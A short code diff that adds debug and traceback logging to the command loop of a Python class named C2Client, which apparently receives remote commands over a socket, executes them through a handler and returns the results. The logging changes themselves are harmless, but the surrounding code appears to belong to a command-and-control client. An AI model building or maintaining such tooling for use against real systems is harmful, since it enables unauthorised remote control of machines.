@@ -284,10 +284,14 @@ class C2Client:
                             self.debug_log("[RUN] No command received, breaking loop")
                             break
                         
+                        self.debug_log("[RUN] About to call handle_command with: {0}".format(str(cmd_data)[:150]))
                         response = self.handle_command(cmd_data)
+                        self.debug_log("[RUN] Response: {0}".format(str(response)[:150]))
                         self.send_json(response)
                 except Exception as e:
                     self.debug_log("[RUN] Exception in command loop: {0}".format(str(e)))
+                    import traceback
+                    self.debug_log("[RUN] Traceback: {0}".format(traceback.format_exc()))
                 finally:
                     try:
                         self.socket.close()
